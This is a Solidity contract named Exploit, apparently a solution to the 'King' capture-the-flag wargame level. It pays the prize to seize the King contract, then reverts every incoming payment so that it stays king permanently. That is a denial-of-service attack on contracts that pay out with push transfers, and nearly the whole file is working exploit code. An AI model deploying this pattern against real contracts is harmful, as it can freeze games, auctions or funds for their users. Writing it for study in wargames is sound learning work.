// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './King.sol';

contract Exploit {
    function seizeKingship(King king) external payable {
        require(msg.value >= king.prize(), 'Pay more than the current prize');
        (bool success, ) = address(king).call{value: msg.value}('');
        require(success, 'Payment failed');
    }

    receive() external payable {
        /* 
        After Exploit once seizes the throne, it will forever remain the king  because all subsequent King smart contract payments will be reverted on the next line.
         */
        revert('I am king forever!');
    }
}
